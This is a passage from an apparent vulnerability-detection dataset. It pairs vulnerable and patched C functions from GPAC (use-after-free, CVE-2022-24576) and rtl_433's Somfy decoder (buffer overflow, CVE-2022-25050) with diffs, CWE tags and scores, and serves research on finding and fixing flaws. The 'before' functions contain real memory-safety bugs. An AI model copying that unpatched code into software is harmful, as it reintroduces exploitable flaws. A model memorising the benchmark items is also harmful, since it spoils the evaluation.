VAR_0 = strstr(VAR_0, ""-->"");
if (!VAR_0) goto exit;
VAR_0 += 3;
while (VAR_0[0] && strchr(""\n\r\t "", (char) VAR_0[0]))
VAR_0 ++;
} else {
break;
}
}
if (!strncmp(VAR_0, ""<XMT-A"", strlen(""<XMT-A""))
|| strstr(VAR_0, ""urn:mpeg:mpeg4:xmta:schema:2002"")
) {
VAR_3 = ""application/x-xmt"";
} else if (strstr(VAR_0, ""<X3D"")
|| strstr(VAR_0, ""http://www.web3d.org/specifications/x3d-3.0.xsd"")
) {
VAR_3 = ""model/x3d+xml"";
} else if (strstr(VAR_0, ""<saf"")
|| strstr(VAR_0, ""urn:mpeg:mpeg4:SAF:2005"")
|| strstr(VAR_0, ""urn:mpeg:mpeg4:LASeR:2005"")
) {
VAR_3 = ""application/x-LASeR+xml"";
} else if (!strncmp(VAR_0, ""<DIMSStream"", strlen(""<DIMSStream"") ) ) {
VAR_3 = ""application/dims"";
} else if (!strncmp(VAR_0, ""<svg"", 4) || strstr(VAR_0, ""http://www.w3.org/2000/svg"") ) {
VAR_3 = ""image/svg+xml"";
} else if (!strncmp(VAR_0, ""<widget"", strlen(""<widget"") ) ) {
VAR_3 = ""application/widget"";
} else if (!strncmp(VAR_0, ""<NHNTStream"", strlen(""<NHNTStream"") ) ) {
VAR_3 = ""application/x-nhml"";
} else if (!strncmp(VAR_0, ""<TextStream"", strlen(""<TextStream"") ) ) {
VAR_3 = ""text/ttxt"";
} else if (!strncmp(VAR_0, ""<text3GTrack"", strlen(""<text3GTrack"") ) ) {
VAR_3 = ""quicktime/text"";
}
else {
while (1) {
while (VAR_0[0] && strchr(""\n\r\t "", (char) VAR_0[0]))
VAR_0 ++;
if (!strncmp(VAR_0, ""#VRML V2.0"", strlen(""#VRML V2.0""))) {
VAR_3 = ""model/vrml"";
goto exit;
}
if (!strncmp(VAR_0, ""#X3D V3.0"", strlen(""#X3D V3.0""))) {
VAR_3 = ""model/x3d+vrml"";
goto exit;
}
if ((VAR_0[0] != '#')
&& strncmp(VAR_0, ""PROFILE"", strlen(""PROFILE""))
&& strncmp(VAR_0, ""COMPONENT"", strlen(""COMPONENT""))
&& strncmp(VAR_0, ""META"", strlen(""META""))
&& strncmp(VAR_0, ""IMPORT"", strlen(""IMPORT""))
&& strncmp(VAR_0, ""EXPORT"", strlen(""EXPORT""))
) {
break;
}
VAR_0 = strchr(VAR_0, '\n');
if (!VAR_0) goto exit;
}
if (!strncmp(VAR_0, ""InitialObjectDescriptor"", strlen(""InitialObjectDescriptor""))
|| !strncmp(VAR_0, ""EXTERNPROTO"", strlen(""EXTERNPROTO""))
|| !strncmp(VAR_0, ""PROTO"", strlen(""PROTO""))
|| !strncmp(VAR_0, ""Group"", strlen(""Group""))
|| !strncmp(VAR_0, ""OrderedGroup"", strlen(""OrderedGroup""))
|| !strncmp(VAR_0, ""Layer2D"", strlen(""Layer2D""))
|| !strncmp(VAR_0, ""Layer3D"", strlen(""Layer3D""))
) {
if (strstr(VAR_0, ""children""))
VAR_3 = ""application/x-bt"";
}
}
exit:
if (VAR_4) gf_free(VAR_4);
if (VAR_3) {
*VAR_2 = VAR_7;
return VAR_3;
}
*VAR_2 = VAR_8;
return NULL;
}",gpac/96699aabae042f8f55cf8a85fa5758e3db752bae/load_bt_xmt.c/vul/before/0.json,"static const char *ctxload_probe_data(const u8 *probe_data, u32 size, GF_FilterProbeScore *score)
{
	const char *mime_type = NULL;
	char *dst = NULL;
	GF_Err e;
	char *res=NULL;

	/* check gzip magic header */
	if ((size>2) && (probe_data[0] == 0x1f) && (probe_data[1] == 0x8b)) {
		*score = GF_FPROBE_EXT_MATCH;
		return ""btz|bt.gz|xmt.gz|xmtz|wrl.gz|x3dv.gz|x3dvz|x3d.gz|x3dz"";
	}

	e = gf_utf_get_utf8_string_from_bom(probe_data, size, &dst, &res);
	if (e) return NULL;

	//strip all spaces and \r\n
	while (probe_data[0] && strchr(""\n\r\t "", (char) probe_data[0]))
		probe_data ++;

	//for XML, strip doctype, <?xml and comments
	while (1) {
		if (!strncmp(probe_data, ""<!DOCTYPE"", 9)) {
			probe_data = strchr(probe_data, '>');
			if (!probe_data) goto exit;
			probe_data++;
			while (probe_data[0] && strchr(""\n\r\t "", (char) probe_data[0]))
				probe_data ++;
		}
		//for XML, strip xml header
		else if (!strncmp(probe_data, ""<?xml"", 5)) {
			probe_data = strstr(probe_data, ""?>"");
			if (!probe_data) goto exit;

			probe_data += 2;
			while (probe_data[0] && strchr(""\n\r\t "", (char) probe_data[0]))
				probe_data ++;
		}
		else if (!strncmp(probe_data, ""<!--"", 4)) {
			probe_data = strstr(probe_data, ""-->"");
			if (!probe_data) goto exit;
			probe_data += 3;
			while (probe_data[0] && strchr(""\n\r\t "", (char) probe_data[0]))
				probe_data ++;
		} else {
			break;
		}
	}
	//probe_data is now the first element of the document, if XML
	//we should refin by getting the xmlns attribute value rather than searching for its value...

	if (!strncmp(probe_data, ""<XMT-A"", strlen(""<XMT-A""))
		|| strstr(probe_data, ""urn:mpeg:mpeg4:xmta:schema:2002"")
	) {
		mime_type = ""application/x-xmt"";
	} else if (strstr(probe_data, ""<X3D"")
		|| strstr(probe_data, ""http://www.web3d.org/specifications/x3d-3.0.xsd"")
	) {
		mime_type = ""model/x3d+xml"";
	} else if (strstr(probe_data, ""<saf"")
		|| strstr(probe_data, ""urn:mpeg:mpeg4:SAF:2005"")
		|| strstr(probe_data, ""urn:mpeg:mpeg4:LASeR:2005"")
	) {
		mime_type = ""application/x-LASeR+xml"";
	} else if (!strncmp(probe_data, ""<DIMSStream"", strlen(""<DIMSStream"") ) ) {
		mime_type = ""application/dims"";
	} else if (!strncmp(probe_data, ""<svg"", 4) || strstr(probe_data, ""http://www.w3.org/2000/svg"") ) {
		mime_type = ""image/svg+xml"";
	} else if (!strncmp(probe_data, ""<widget"", strlen(""<widget"") ) ) {
		mime_type = ""application/widget"";
	} else if (!strncmp(probe_data, ""<NHNTStream"", strlen(""<NHNTStream"") ) ) {
		mime_type = ""application/x-nhml"";
	} else if (!strncmp(probe_data, ""<TextStream"", strlen(""<TextStream"") ) ) {
		mime_type = ""text/ttxt"";
	} else if (!strncmp(probe_data, ""<text3GTrack"", strlen(""<text3GTrack"") ) ) {
		mime_type = ""quicktime/text"";
	}
	//BT/VRML with no doc header
	else {
		//get first keyword
		while (1) {
			//strip all spaces and \r\n
			while (probe_data[0] && strchr(""\n\r\t "", (char) probe_data[0]))
				probe_data ++;

			//VRML / XRDV files
			if (!strncmp(probe_data, ""#VRML V2.0"", strlen(""#VRML V2.0""))) {
				mime_type = ""model/vrml"";
				goto exit;
			}
			if (!strncmp(probe_data, ""#X3D V3.0"", strlen(""#X3D V3.0""))) {
				mime_type = ""model/x3d+vrml"";
				goto exit;
			}

			//skip comment lines and some specific X3D keyword (we want to fetch a group
			if ((probe_data[0] != '#')
				&& strncmp(probe_data, ""PROFILE"", strlen(""PROFILE""))
				&& strncmp(probe_data, ""COMPONENT"", strlen(""COMPONENT""))
				&& strncmp(probe_data, ""META"", strlen(""META""))
				&& strncmp(probe_data, ""IMPORT"", strlen(""IMPORT""))
				&& strncmp(probe_data, ""EXPORT"", strlen(""EXPORT""))
			) {
				break;
			}
			//skip line and go one
			probe_data = strchr(probe_data, '\n');
			if (!probe_data) goto exit;
		}
		
		if (!strncmp(probe_data, ""InitialObjectDescriptor"", strlen(""InitialObjectDescriptor""))
			|| !strncmp(probe_data, ""EXTERNPROTO"", strlen(""EXTERNPROTO""))
			|| !strncmp(probe_data, ""PROTO"", strlen(""PROTO""))
			|| !strncmp(probe_data, ""Group"", strlen(""Group""))
			|| !strncmp(probe_data, ""OrderedGroup"", strlen(""OrderedGroup""))
			|| !strncmp(probe_data, ""Layer2D"", strlen(""Layer2D""))
			|| !strncmp(probe_data, ""Layer3D"", strlen(""Layer3D""))
		) {
			if (strstr(probe_data, ""children""))
				mime_type = ""application/x-bt"";
		}
	}


exit:

	if (dst) gf_free(dst);
	if (mime_type) {
		*score = GF_FPROBE_MAYBE_SUPPORTED;
		return mime_type;
	}

	*score = GF_FPROBE_NOT_SUPPORTED;
	return NULL;
}","static const char *ctxload_probe_data(const u8 *VAR_0, u32 VAR_1, GF_FilterProbeScore *VAR_2)
{
	const char *VAR_3 = NULL;
	char *VAR_4 = NULL;
	GF_Err VAR_5;
	char *VAR_6=NULL;

	/* COMMENT_0 */
	if ((VAR_1>2) && (VAR_0[0] == 0x1f) && (VAR_0[1] == 0x8b)) {
		*VAR_2 = VAR_7;
		return ""btz|bt.gz|xmt.gz|xmtz|wrl.gz|x3dv.gz|x3dvz|x3d.gz|x3dz"";
	}

	VAR_5 = gf_utf_get_utf8_string_from_bom(VAR_0, VAR_1, &VAR_4, &VAR_6);
	if (VAR_5) return NULL;

	/* COMMENT_1 */
	while (VAR_0[0] && strchr(""\n\r\t "", (char) VAR_0[0]))
		VAR_0 ++;

	/* COMMENT_2 */
	while (1) {
		if (!strncmp(VAR_0, ""<!DOCTYPE"", 9)) {
			VAR_0 = strchr(VAR_0, '>');
			if (!VAR_0) goto exit;
			VAR_0++;
			while (VAR_0[0] && strchr(""\n\r\t "", (char) VAR_0[0]))
				VAR_0 ++;
		}
		/* COMMENT_3 */
		else if (!strncmp(VAR_0, ""<?xml"", 5)) {
			VAR_0 = strstr(VAR_0, ""?>"");
			if (!VAR_0) goto exit;

			VAR_0 += 2;
			while (VAR_0[0] && strchr(""\n\r\t "", (char) VAR_0[0]))
				VAR_0 ++;
		}
		else if (!strncmp(VAR_0, ""<!--"", 4)) {
			VAR_0 = strstr(VAR_0, ""-->"");
			if (!VAR_0) goto exit;
			VAR_0 += 3;
			while (VAR_0[0] && strchr(""\n\r\t "", (char) VAR_0[0]))
				VAR_0 ++;
		} else {
			break;
		}
	}
	/* COMMENT_4 */
	/* COMMENT_5 */

	if (!strncmp(VAR_0, ""<XMT-A"", strlen(""<XMT-A""))
		|| strstr(VAR_0, ""urn:mpeg:mpeg4:xmta:schema:2002"")
	) {
		VAR_3 = ""application/x-xmt"";
	} else if (strstr(VAR_0, ""<X3D"")
		|| strstr(VAR_0, ""http://www.web3d.org/specifications/x3d-3.0.xsd"")
	) {
		VAR_3 = ""model/x3d+xml"";
	} else if (strstr(VAR_0, ""<saf"")
		|| strstr(VAR_0, ""urn:mpeg:mpeg4:SAF:2005"")
		|| strstr(VAR_0, ""urn:mpeg:mpeg4:LASeR:2005"")
	) {
		VAR_3 = ""application/x-LASeR+xml"";
	} else if (!strncmp(VAR_0, ""<DIMSStream"", strlen(""<DIMSStream"") ) ) {
		VAR_3 = ""application/dims"";
	} else if (!strncmp(VAR_0, ""<svg"", 4) || strstr(VAR_0, ""http://www.w3.org/2000/svg"") ) {
		VAR_3 = ""image/svg+xml"";
	} else if (!strncmp(VAR_0, ""<widget"", strlen(""<widget"") ) ) {
		VAR_3 = ""application/widget"";
	} else if (!strncmp(VAR_0, ""<NHNTStream"", strlen(""<NHNTStream"") ) ) {
		VAR_3 = ""application/x-nhml"";
	} else if (!strncmp(VAR_0, ""<TextStream"", strlen(""<TextStream"") ) ) {
		VAR_3 = ""text/ttxt"";
	} else if (!strncmp(VAR_0, ""<text3GTrack"", strlen(""<text3GTrack"") ) ) {
		VAR_3 = ""quicktime/text"";
	}
	/* COMMENT_6 */
	else {
		/* COMMENT_7 */
		while (1) {
			/* COMMENT_1 */
			while (VAR_0[0] && strchr(""\n\r\t "", (char) VAR_0[0]))
				VAR_0 ++;

			/* COMMENT_8 */
			if (!strncmp(VAR_0, ""#VRML V2.0"", strlen(""#VRML V2.0""))) {
				VAR_3 = ""model/vrml"";
				goto exit;
			}
			if (!strncmp(VAR_0, ""#X3D V3.0"", strlen(""#X3D V3.0""))) {
				VAR_3 = ""model/x3d+vrml"";
				goto exit;
			}

			/* COMMENT_9 */
			if ((VAR_0[0] != '#')
				&& strncmp(VAR_0, ""PROFILE"", strlen(""PROFILE""))
				&& strncmp(VAR_0, ""COMPONENT"", strlen(""COMPONENT""))
				&& strncmp(VAR_0, ""META"", strlen(""META""))
				&& strncmp(VAR_0, ""IMPORT"", strlen(""IMPORT""))
				&& strncmp(VAR_0, ""EXPORT"", strlen(""EXPORT""))
			) {
				break;
			}
			/* COMMENT_10 */
			VAR_0 = strchr(VAR_0, '\n');
			if (!VAR_0) goto exit;
		}
		
		if (!strncmp(VAR_0, ""InitialObjectDescriptor"", strlen(""InitialObjectDescriptor""))
			|| !strncmp(VAR_0, ""EXTERNPROTO"", strlen(""EXTERNPROTO""))
			|| !strncmp(VAR_0, ""PROTO"", strlen(""PROTO""))
			|| !strncmp(VAR_0, ""Group"", strlen(""Group""))
			|| !strncmp(VAR_0, ""OrderedGroup"", strlen(""OrderedGroup""))
			|| !strncmp(VAR_0, ""Layer2D"", strlen(""Layer2D""))
			|| !strncmp(VAR_0, ""Layer3D"", strlen(""Layer3D""))
		) {
			if (strstr(VAR_0, ""children""))
				VAR_3 = ""application/x-bt"";
		}
	}


exit:

	if (VAR_4) gf_free(VAR_4);
	if (VAR_3) {
		*VAR_2 = VAR_8;
		return VAR_3;
	}

	*VAR_2 = VAR_9;
	return NULL;
}",gpac/96699aabae042f8f55cf8a85fa5758e3db752bae/load_bt_xmt.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -2,7 +2,8 @@
 {
 	const char *mime_type = NULL;
 	char *dst = NULL;
-	u8 *res;
+	GF_Err e;
+	char *res=NULL;
 
 	/* check gzip magic header */
 	if ((size>2) && (probe_data[0] == 0x1f) && (probe_data[1] == 0x8b)) {
@@ -10,8 +11,8 @@
 		return ""btz|bt.gz|xmt.gz|xmtz|wrl.gz|x3dv.gz|x3dvz|x3d.gz|x3dz"";
 	}
 
-	res = gf_utf_get_utf8_string_from_bom((char *)probe_data, size, &dst);
-	if (res) probe_data = res;
+	e = gf_utf_get_utf8_string_from_bom(probe_data, size, &dst, &res);
+	if (e) return NULL;
 
 	//strip all spaces and \r\n
 	while (probe_data[0] && strchr(""\n\r\t "", (char) probe_data[0]))","{'deleted_lines': ['\tu8 *res;', '\tres = gf_utf_get_utf8_string_from_bom((char *)probe_data, size, &dst);', '\tif (res) probe_data = res;'], 'added_lines': ['\tGF_Err e;', '\tchar *res=NULL;', '\te = gf_utf_get_utf8_string_from_bom(probe_data, size, &dst, &res);', '\tif (e) return NULL;']}",True,GPAC 1.0.1 is affected by Use After Free through MP4Box.,5.5,MEDIUM,1,valid,2022-01-21T11:26:28Z,4
CVE-2022-24576,['CWE-416'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,gpac,fixed #2061,96699aabae042f8f55cf8a85fa5758e3db752bae,https://github.com/gpac/gpac/commit/96699aabae042f8f55cf8a85fa5758e3db752bae,src/filters/load_text.c,txtin_probe_data,"static const char *txtin_probe_data(const u8 *data, u32 data_size, GF_FilterProbeScore *score)
{
char *dst = NULL;
u8 *res;
res = gf_utf_get_utf8_string_from_bom((char *)data, data_size, &dst);
if (res) data = res;
#define PROBE_OK(_score, _mime) \
*score = _score;\
if (dst) gf_free(dst);\
return _mime; \
if (!strncmp(data, ""WEBVTT"", 6)) {
PROBE_OK(GF_FPROBE_SUPPORTED, ""subtitle/vtt"")
}
if (strstr(data, "" --> "")) {
PROBE_OK(GF_FPROBE_MAYBE_SUPPORTED, ""subtitle/srt"")
}
if (!strncmp(data, ""FWS"", 3) || !strncmp(data, ""CWS"", 3)) {
PROBE_OK(GF_FPROBE_MAYBE_SUPPORTED, ""application/x-shockwave-flash"")
}
if ((data[0]=='{') && strstr(data, ""}{"")) {
PROBE_OK(GF_FPROBE_MAYBE_SUPPORTED, ""subtitle/sub"")
}
if (!strstr(data, ""?>"") ) {
if (dst) gf_free(dst);
return NULL;
}
if (strstr(data, ""<x-quicktime-tx3g"") || strstr(data, ""<text3GTrack"")) {
PROBE_OK(GF_FPROBE_MAYBE_SUPPORTED, ""quicktime/text"")
}
if (strstr(data, ""TextStream"")) {
PROBE_OK(GF_FPROBE_MAYBE_SUPPORTED, ""subtitle/ttxt"")
}
if (strstr(data, ""<tt "") || strstr(data, "":tt "")) {
PROBE_OK(GF_FPROBE_MAYBE_SUPPORTED, ""subtitle/ttml"")
}
if (dst) gf_free(dst);
return NULL;
}","static const char *txtin_probe_data(const u8 *VAR_0, u32 VAR_1, GF_FilterProbeScore *VAR_2)
{
char *VAR_3 = NULL;
u8 *VAR_4;
VAR_4 = gf_utf_get_utf8_string_from_bom((char *)VAR_0, VAR_1, &VAR_3);
if (VAR_4) VAR_0 = VAR_4;
#define PROBE_OK(VAR_5, VAR_6) \
*score = _score;\
if (dst) gf_free(dst);\
return _mime; \
if (!strncmp(VAR_0, ""WEBVTT"", 6)) {
PROBE_OK(VAR_7, ""subtitle/vtt"")
}
if (strstr(VAR_0, "" --> "")) {
PROBE_OK(VAR_8, ""subtitle/srt"")
}
if (!strncmp(VAR_0, ""FWS"", 3) || !strncmp(VAR_0, ""CWS"", 3)) {
PROBE_OK(VAR_8, ""application/x-shockwave-flash"")
}
if ((VAR_0[0]=='{') && strstr(VAR_0, ""}{"")) {
PROBE_OK(VAR_8, ""subtitle/sub"")
}
if (!strstr(VAR_0, ""?>"") ) {
if (VAR_3) gf_free(VAR_3);
return NULL;
}
if (strstr(VAR_0, ""<x-quicktime-tx3g"") || strstr(VAR_0, ""<text3GTrack"")) {
PROBE_OK(VAR_8, ""quicktime/text"")
}
if (strstr(VAR_0, ""TextStream"")) {
PROBE_OK(VAR_8, ""subtitle/ttxt"")
}
if (strstr(VAR_0, ""<tt "") || strstr(VAR_0, "":tt "")) {
PROBE_OK(VAR_8, ""subtitle/ttml"")
}
if (VAR_3) gf_free(VAR_3);
return NULL;
}",gpac/96699aabae042f8f55cf8a85fa5758e3db752bae/load_text.c/vul/before/0.json,"static const char *txtin_probe_data(const u8 *data, u32 data_size, GF_FilterProbeScore *score)
{
	char *dst = NULL;
	char *res=NULL;
	GF_Err e = gf_utf_get_utf8_string_from_bom((char *)data, data_size, &dst, &res);
	if (e) return NULL;
	
#define PROBE_OK(_score, _mime) \
		*score = _score;\
		if (dst) gf_free(dst);\
		return _mime; \


	if (!strncmp(data, ""WEBVTT"", 6)) {
		PROBE_OK(GF_FPROBE_SUPPORTED, ""subtitle/vtt"")
	}
	if (strstr(data, "" --> "")) {
		PROBE_OK(GF_FPROBE_MAYBE_SUPPORTED, ""subtitle/srt"")
	}
	if (!strncmp(data, ""FWS"", 3) || !strncmp(data, ""CWS"", 3)) {
		PROBE_OK(GF_FPROBE_MAYBE_SUPPORTED, ""application/x-shockwave-flash"")
	}

	if ((data[0]=='{') && strstr(data, ""}{"")) {
		PROBE_OK(GF_FPROBE_MAYBE_SUPPORTED, ""subtitle/sub"")

	}
	/*XML formats*/
	if (!strstr(data, ""?>"") ) {
		if (dst) gf_free(dst);
		return NULL;
	}

	if (strstr(data, ""<x-quicktime-tx3g"") || strstr(data, ""<text3GTrack"")) {
		PROBE_OK(GF_FPROBE_MAYBE_SUPPORTED, ""quicktime/text"")
	}
	if (strstr(data, ""TextStream"")) {
		PROBE_OK(GF_FPROBE_MAYBE_SUPPORTED, ""subtitle/ttxt"")
	}
	if (strstr(data, ""<tt "") || strstr(data, "":tt "")) {
		PROBE_OK(GF_FPROBE_MAYBE_SUPPORTED, ""subtitle/ttml"")
	}

	if (dst) gf_free(dst);
	return NULL;
}","static const char *txtin_probe_data(const u8 *VAR_0, u32 VAR_1, GF_FilterProbeScore *VAR_2)
{
	char *VAR_3 = NULL;
	char *VAR_4=NULL;
	GF_Err VAR_5 = gf_utf_get_utf8_string_from_bom((char *)VAR_0, VAR_1, &VAR_3, &VAR_4);
	if (VAR_5) return NULL;
	
#define PROBE_OK(VAR_6, VAR_7) \
		*score = _score;\
		if (dst) gf_free(dst);\
		return _mime; \


	if (!strncmp(VAR_0, ""WEBVTT"", 6)) {
		PROBE_OK(VAR_8, ""subtitle/vtt"")
	}
	if (strstr(VAR_0, "" --> "")) {
		PROBE_OK(VAR_9, ""subtitle/srt"")
	}
	if (!strncmp(VAR_0, ""FWS"", 3) || !strncmp(VAR_0, ""CWS"", 3)) {
		PROBE_OK(VAR_9, ""application/x-shockwave-flash"")
	}

	if ((VAR_0[0]=='{') && strstr(VAR_0, ""}{"")) {
		PROBE_OK(VAR_9, ""subtitle/sub"")

	}
	/* COMMENT_0 */
	if (!strstr(VAR_0, ""?>"") ) {
		if (VAR_3) gf_free(VAR_3);
		return NULL;
	}

	if (strstr(VAR_0, ""<x-quicktime-tx3g"") || strstr(VAR_0, ""<text3GTrack"")) {
		PROBE_OK(VAR_9, ""quicktime/text"")
	}
	if (strstr(VAR_0, ""TextStream"")) {
		PROBE_OK(VAR_9, ""subtitle/ttxt"")
	}
	if (strstr(VAR_0, ""<tt "") || strstr(VAR_0, "":tt "")) {
		PROBE_OK(VAR_9, ""subtitle/ttml"")
	}

	if (VAR_3) gf_free(VAR_3);
	return NULL;
}",gpac/96699aabae042f8f55cf8a85fa5758e3db752bae/load_text.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,11 +1,10 @@
 static const char *txtin_probe_data(const u8 *data, u32 data_size, GF_FilterProbeScore *score)
 {
 	char *dst = NULL;
-	u8 *res;
-
-	res = gf_utf_get_utf8_string_from_bom((char *)data, data_size, &dst);
-	if (res) data = res;
-
+	char *res=NULL;
+	GF_Err e = gf_utf_get_utf8_string_from_bom((char *)data, data_size, &dst, &res);
+	if (e) return NULL;
+	
 #define PROBE_OK(_score, _mime) \
 		*score = _score;\
 		if (dst) gf_free(dst);\","{'deleted_lines': ['\tu8 *res;', '', '\tres = gf_utf_get_utf8_string_from_bom((char *)data, data_size, &dst);', '\tif (res) data = res;', ''], 'added_lines': ['\tchar *res=NULL;', '\tGF_Err e = gf_utf_get_utf8_string_from_bom((char *)data, data_size, &dst, &res);', '\tif (e) return NULL;', '\t']}",True,GPAC 1.0.1 is affected by Use After Free through MP4Box.,5.5,MEDIUM,1,valid,2022-01-21T11:26:28Z,4
CVE-2022-25050,"['CWE-787', 'CWE-193']",AV:N/AC:M/Au:N/C:N/I:N/A:P,0,merbanan/rtl_433,minor: Fix overflow in Clipsal-CMR113 and Somfy-IOHC reported by aug5t7,2dad7b9fc67a1d0bfbe520fbd821678b8f8cc7a8,https://github.com/merbanan/rtl_433/commit/2dad7b9fc67a1d0bfbe520fbd821678b8f8cc7a8,src/devices/somfy_iohc.c,somfy_iohc_decode,"static int somfy_iohc_decode(r_device *decoder, bitbuffer_t *bitbuffer)
{
uint8_t const preamble_pattern[] = {0x57, 0xfd, 0x99};
uint8_t b[19 + 15]; 
if (bitbuffer->num_rows != 1)
return DECODE_ABORT_EARLY;
int offset = bitbuffer_search(bitbuffer, 0, 0, preamble_pattern, 24) + 24;
if (offset >= bitbuffer->bits_per_row[0] - 19 * 10)
return DECODE_ABORT_EARLY;
int num_bits = bitbuffer->bits_per_row[0] - offset;
int len = extract_bytes_uart(bitbuffer->bb[0], offset, num_bits, b);
if (len < 19)
return DECODE_ABORT_LENGTH;
if ((b[0] & 0xf0) != 0xf0)
return DECODE_ABORT_EARLY;
int msg_len = b[0] & 0xf;     if (len < 19 + msg_len)
return DECODE_ABORT_LENGTH;
if (crc16lsb(b, len, 0x8408, 0x0000) != 0)         return DECODE_FAIL_MIC;
bitrow_printf(b, len * 8, ""%s: offset %d, num_bits %d, len %d, msg_len %d\n"", __func__, offset, num_bits, len, msg_len);
int msg_type = (b[0]);
int dst_id   = ((unsigned)b[4] << 24) | (b[3] << 16) | (b[2] << 8) | (b[1]);     int src_id   = ((unsigned)b[8] << 24) | (b[7] << 16) | (b[6] << 8) | (b[5]);     int counter  = (b[len - 10] << 8) | (b[len - 9]);
char msg_str[15 * 2 + 1];
bitrow_snprint(&b[9], msg_len * 8, msg_str, 15 * 2 + 1);
char mac_str[13];
bitrow_snprint(&b[len - 8], 6 * 8, mac_str, 13);
data_t *data = data_make(
""model"",            """",                 DATA_STRING, ""Somfy-IOHC"",
""id"",               """",                 DATA_FORMAT, ""%08x"", DATA_INT, src_id,
""dst_id"",           ""Dest ID"",          DATA_FORMAT, ""%08x"", DATA_INT, dst_id,
""msg_type"",         ""Msg type"",         DATA_FORMAT, ""%02x"", DATA_INT, msg_type,
""msg"",              ""Message"",          DATA_STRING, msg_str,
""counter"",          ""Counter"",          DATA_INT,    counter,
""mac"",              ""MAC"",              DATA_STRING, mac_str,
""mic"",              ""Integrity"",        DATA_STRING, ""CRC"",
NULL);
decoder_output_data(decoder, data);
return 1;
}","static int somfy_iohc_decode(r_device *VAR_0, bitbuffer_t *VAR_1)
{
uint8_t const VAR_2[] = {0x57, 0xfd, 0x99};
uint8_t VAR_3[19 + 15]; 
if (VAR_1->num_rows != 1)
return VAR_4;
int VAR_5 = bitbuffer_search(VAR_1, 0, 0, VAR_2, 24) + 24;
if (VAR_5 >= VAR_1->bits_per_row[0] - 19 * 10)
return VAR_4;
int VAR_6 = VAR_1->bits_per_row[0] - VAR_5;
int VAR_7 = extract_bytes_uart(VAR_1->bb[0], VAR_5, VAR_6, VAR_3);
if (VAR_7 < 19)
return VAR_8;
if ((VAR_3[0] & 0xf0) != 0xf0)
return VAR_4;
int VAR_9 = VAR_3[0] & 0xf; 
if (VAR_7 < 19 + VAR_9)
return VAR_8;
if (crc16lsb(VAR_3, VAR_7, 0x8408, 0x0000) != 0) 
return VAR_10;
bitrow_printf(VAR_3, VAR_7 * 8, ""%s: offset %d, num_bits %d, len %d, msg_len %d\n"", VAR_11, VAR_5, VAR_6, VAR_7, VAR_9);
int VAR_12 = (VAR_3[0]);
int VAR_13   = ((unsigned)VAR_3[4] << 24) | (VAR_3[3] << 16) | (VAR_3[2] << 8) | (VAR_3[1]); 
int VAR_14   = ((unsigned)VAR_3[8] << 24) | (VAR_3[7] << 16) | (VAR_3[6] << 8) | (VAR_3[5]); 
int VAR_15  = (VAR_3[VAR_7 - 10] << 8) | (VAR_3[VAR_7 - 9]);
char VAR_16[15 * 2 + 1];
bitrow_snprint(&VAR_3[9], VAR_9 * 8, VAR_16, 15 * 2 + 1);
char VAR_17[13];
bitrow_snprint(&VAR_3[VAR_7 - 8], 6 * 8, VAR_17, 13);
data_t *VAR_18 = data_make(
""model"",            """",                 VAR_19, ""Somfy-IOHC"",
""id"",               """",                 VAR_20, ""%08x"", VAR_21, VAR_14,
""dst_id"",           ""Dest ID"",          VAR_20, ""%08x"", VAR_21, VAR_13,
""msg_type"",         ""Msg type"",         VAR_20, ""%02x"", VAR_21, VAR_12,
""msg"",              ""Message"",          VAR_19, VAR_16,
""counter"",          ""Counter"",          VAR_21,    VAR_15,
""mac"",              ""MAC"",              VAR_19, VAR_17,
""mic"",              ""Integrity"",        VAR_19, ""CRC"",
NULL);
decoder_output_data(VAR_0, VAR_18);
return 1;
}",merbanan/rtl_433/2dad7b9fc67a1d0bfbe520fbd821678b8f8cc7a8/somfy_iohc.c/vul/before/0.json,"static int somfy_iohc_decode(r_device *decoder, bitbuffer_t *bitbuffer)
{
    uint8_t const preamble_pattern[] = {0x57, 0xfd, 0x99};

    uint8_t b[19 + 15]; // 19 byte + up 15 byte payload

    if (bitbuffer->num_rows != 1)
        return DECODE_ABORT_EARLY;

    unsigned offset = bitbuffer_search(bitbuffer, 0, 0, preamble_pattern, 24) + 24;
    if (offset + 19 * 10 >= bitbuffer->bits_per_row[0])
        return DECODE_ABORT_EARLY;

    unsigned num_bits = bitbuffer->bits_per_row[0] - offset;
    num_bits = MIN(num_bits, sizeof (b) * 8);

    int len = extract_bytes_uart(bitbuffer->bb[0], offset, num_bits, b);
    if (len < 19)
        return DECODE_ABORT_LENGTH;

    if ((b[0] & 0xf0) != 0xf0)
        return DECODE_ABORT_EARLY;

    int msg_len = b[0] & 0xf; // should be 6 or 8
    if (len < 19 + msg_len)
        return DECODE_ABORT_LENGTH;

    // calculate and verify checksum
    if (crc16lsb(b, len, 0x8408, 0x0000) != 0) // unreflected poly 0x1021
        return DECODE_FAIL_MIC;
    bitrow_printf(b, len * 8, ""%s: offset %u, num_bits %u, len %d, msg_len %d\n"", __func__, offset, num_bits, len, msg_len);

    int msg_type = (b[0]);
    int dst_id   = ((unsigned)b[4] << 24) | (b[3] << 16) | (b[2] << 8) | (b[1]); // assume Little-Endian
    int src_id   = ((unsigned)b[8] << 24) | (b[7] << 16) | (b[6] << 8) | (b[5]); // assume Little-Endian
    int counter  = (b[len - 10] << 8) | (b[len - 9]);
    char msg_str[15 * 2 + 1];
    bitrow_snprint(&b[9], msg_len * 8, msg_str, 15 * 2 + 1);
    char mac_str[13];
    bitrow_snprint(&b[len - 8], 6 * 8, mac_str, 13);

    /* clang-format off */
    data_t *data = data_make(
            ""model"",            """",                 DATA_STRING, ""Somfy-IOHC"",
            ""id"",               """",                 DATA_FORMAT, ""%08x"", DATA_INT, src_id,
            ""dst_id"",           ""Dest ID"",          DATA_FORMAT, ""%08x"", DATA_INT, dst_id,
            ""msg_type"",         ""Msg type"",         DATA_FORMAT, ""%02x"", DATA_INT, msg_type,
            ""msg"",              ""Message"",          DATA_STRING, msg_str,
            ""counter"",          ""Counter"",          DATA_INT,    counter,
            ""mac"",              ""MAC"",              DATA_STRING, mac_str,
            ""mic"",              ""Integrity"",        DATA_STRING, ""CRC"",
            NULL);
    /* clang-format on */

    decoder_output_data(decoder, data);
    return 1;
}","static int somfy_iohc_decode(r_device *VAR_0, bitbuffer_t *VAR_1)
{
    uint8_t const VAR_2[] = {0x57, 0xfd, 0x99};

    uint8_t VAR_3[19 + 15]; /* COMMENT_0 */

    if (VAR_1->num_rows != 1)
        return VAR_4;

    unsigned VAR_5 = bitbuffer_search(VAR_1, 0, 0, VAR_2, 24) + 24;
